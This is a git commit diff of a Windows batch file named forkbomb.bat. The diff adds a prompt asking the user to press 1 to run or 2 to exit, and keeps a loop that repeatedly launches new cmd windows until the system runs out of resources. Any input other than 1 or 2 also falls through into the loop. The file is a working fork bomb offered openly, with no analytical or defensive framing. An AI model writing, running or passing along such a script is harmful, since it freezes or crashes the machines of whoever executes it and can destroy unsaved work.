2e875b15d58353d9635cb16607fa638a5d939432
LS232123221 <sebluc06989@gmail.com>
2024-10-23 22:05:45 +0100

    Add files via upload

--- forkbomb.bat
+++ forkbomb.bat
@@ -1,6 +1,23 @@
 @echo off
+title ForkBomb
+mode 40, 20
+chcp 65001 >nul
+call powershell exit >nul
+color B
 
-:n
+
+:main
+echo what do you want to happan 
+echo do you want to run this script
+echo by pressing (1) or you can 
+echo exit by pressing (2) 
+
+set /p input=
+if /I "%input%" EQU "1" goto runfork
+if /I "%input%" EQU "2" goto exit
+
+
+:runfork 
 start cmd
 start cmd
 start cmd
@@ -10,4 +27,12 @@ start cmd
 start cmd
 start cmd
 start cmd
-goto n 
+start cmd
+goto runfork 
+
+
+
+:exit 
+exit 1 
+
+
